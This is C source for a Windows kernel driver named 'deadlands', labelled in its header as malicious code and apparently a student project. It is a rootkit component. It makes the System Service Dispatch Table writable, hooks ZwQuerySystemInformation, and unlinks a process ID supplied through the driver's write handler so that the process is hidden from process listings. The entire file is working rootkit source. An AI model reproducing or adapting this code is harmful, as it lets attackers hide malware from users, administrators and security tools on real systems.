/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-ssdt.c ]
** Method	: [ System Service Dispatch Table ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#include <ntddk.h>
#include <string.h>
#include <stdlib.h>
#include "deadlands-ssdt.h"

/*
** INITIALIZATIONS:
*/
_ZWQUERYSYSTEMINFORMATION	OldZwQuerySystemInformation;

PMDL  		gl_pMdlSystemCall;
PVOID		*MappedSystemCallTable;
PLIST_ENTRY	pNode = NULL;
INT32		pid = -1;

/*
** DRIVER FUNCTIONS:
*/
NTSTATUS	DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DWORD			i;
	NTSTATUS		NTstatus;
	PDEVICE_OBJECT	pDeviceObject;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	dosDeviceName;

	DbgPrint("[MSG]: deadlands HOOK SSDT - driver entry\n");

	pDeviceObject = NULL;
	RtlInitUnicodeString(&deviceName, DEVICE_NAME);
	RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
	NTstatus = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	if (NTstatus != STATUS_SUCCESS)
	{
		DbgPrint("[ERR]: deadlands - can't create I/O device!\n");
		return (NTstatus);
	}

	pDeviceObject->Flags |= DO_BUFFERED_IO;
	
	pDriverObject->DriverUnload = DriverUnload;
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DriverIrpUnsupported;

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverIrpCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverIrpClose;
	pDriverObject->MajorFunction[IRP_MJ_WRITE] = DriverIrpWrite;
 
	IoCreateSymbolicLink(&dosDeviceName, &deviceName);

	// Map the memory into the domain -->> can change the permissions on the MDL
   	gl_pMdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4, 0, 0, NULL);
	if (!gl_pMdlSystemCall)
		return (STATUS_UNSUCCESSFUL);

	// 1. Specifies a virtual memory buffer in nonpaged pool
	// 2. Updates it to describe the underlying physical pages. 
   	MmBuildMdlForNonPagedPool(gl_pMdlSystemCall);

	// Maps the physical pages that are described by gl_pMdlSystemCall.
	MappedSystemCallTable = MmMapLockedPages(gl_pMdlSystemCall, KernelMode);
	
	HookSyscall();
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING	dosDeviceName;
	PLIST_ENTRY		pPrev;
	PLIST_ENTRY		pNext;

	DbgPrint("[MSG]: deadlands HOOK SSDT - driver unload\n");

	unHookSyscall();

	if (gl_pMdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, gl_pMdlSystemCall);
		IoFreeMdl(gl_pMdlSystemCall);
	}

	RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
	IoDeleteSymbolicLink(&dosDeviceName);
	IoDeleteDevice(pDriverObject->DeviceObject);
	
	return (STATUS_SUCCESS);
}


NTSTATUS	DriverIrpUnsupported(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp unsupported\n");
	return (STATUS_NOT_SUPPORTED);
}

NTSTATUS	DriverIrpCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp create\n");
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp close\n");
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	PIO_STACK_LOCATION	pIoStackIrp;
	NTSTATUS			NTstatus;
	PCHAR				pInputBuffer;
	
	DbgPrint("[MSG]: deadlands SSDT - driver irp write\n");

	pIoStackIrp = IoGetCurrentIrpStackLocation(pIrp);
	pInputBuffer = (PCHAR)pIrp->AssociatedIrp.SystemBuffer;
	 
	if (pInputBuffer != NULL && strlen(pInputBuffer) >= 2)
	{
		if (pInputBuffer[0] == 'h')
			pid = atoi(&pInputBuffer[1]);
	}
	pInputBuffer = NULL;
	return (STATUS_UNSUCCESSFUL);
}

/*
** ALGORITHM: HOOK SSDT
*/
NTSTATUS	HookSyscall(void)
{
	DbgPrint("[MSG]: deadlands HOOK SSDT - hook syscall\n");
	OldZwQuerySystemInformation = (PVOID)InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(ZwQuerySystemInformation)], (LONG) NewZwQuerySystemInformation);
	return (STATUS_SUCCESS);
}

NTSTATUS	unHookSyscall(void)
{
	DbgPrint("[MSG]: deadlands HOOK SSDT - unhook syscall\n");
	InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(ZwQuerySystemInformation)], (LONG) OldZwQuerySystemInformation);
	return (STATUS_SUCCESS);
}

// handler
NTSTATUS	NewZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
										 PVOID SystemInformation,
										 ULONG SystemInformationLength,
										 PULONG ReturnLength)
{
	NTSTATUS	NTstatus;

	DbgPrint("[MESG]: deadlands HOOK SSDT - my NewZwQuerySystemInforamtion\n");
	NTstatus = ((_ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation))
		(SystemInformationClass, SystemInformation,	SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(NTstatus))
	{
		if (SystemInformationClass == SYSTEMPROCESSINFORMATION && pid != -1)
			HideProcess(SystemInformation);
	}
	return (NTstatus);
}

NTSTATUS	HideProcess(IN OUT PVOID SystemInformation)
{
	UNICODE_STRING				processName;
	struct _SYSTEM_PROCESSES	*curr;
	struct _SYSTEM_PROCESSES	*prev;

	DbgPrint("[MESG]: deadlands HOOK SSDT - process to hide [pid #%d]\n", pid);

	prev = NULL;
	curr = (struct _SYSTEM_PROCESSES *)SystemInformation;

	while (curr != NULL)
	{
		if (curr->ProcessName.Buffer != NULL)
		{
			// RtlCompareUnicodeString(&processName, &(curr->ProcessName), FALSE)
			if (curr->ProcessId == pid)
			{
				DbgPrint("[MSG]: deadlands HOOK SSDT - process pid found at 0x%p\n", curr);
				if(prev != NULL)
				{
					if(curr->NextEntryOffset)
						prev->NextEntryOffset += curr->NextEntryOffset;
					else
						prev->NextEntryOffset = 0;
				}
				else
				{
					if(curr->NextEntryOffset != 0)
						(char *)SystemInformation += curr->NextEntryOffset;
					else
						SystemInformation = NULL;
				}
				return (STATUS_SUCCESS);
			}
		}
		prev = curr;
		if(curr->NextEntryOffset != 0)
			((char *)curr += curr->NextEntryOffset);
		else
			curr = NULL;
	}
	return (STATUS_UNSUCCESSFUL);
}
